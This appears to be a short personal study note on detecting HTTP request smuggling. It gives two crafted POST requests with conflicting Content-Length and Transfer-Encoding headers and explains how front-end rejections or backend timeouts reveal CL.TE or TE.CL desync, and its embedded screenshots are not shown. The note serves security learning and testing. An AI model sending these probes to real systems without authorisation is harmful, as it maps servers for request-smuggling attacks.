# Pre-requisites
![[Preparing Steps for Http Request smugglind.png]]
# Detection
![[Detection HTTP Request Smuggling.png]]
Req 1:
``` HTTP 
POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

3
abc
X
```
Req 2:
```HTTP
POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

X
```


### For Request 1
###### Front-end Rejected -> TE.{CL OR TE}![[Invalid Chunk SIze.png]]
###### Backend Timeout -> CL.TE
![[Backend Timeout first req.png]]

### For Request 2
###### Backend Timeout -> TE.CL
![[Backend Timeout req 2.png]]

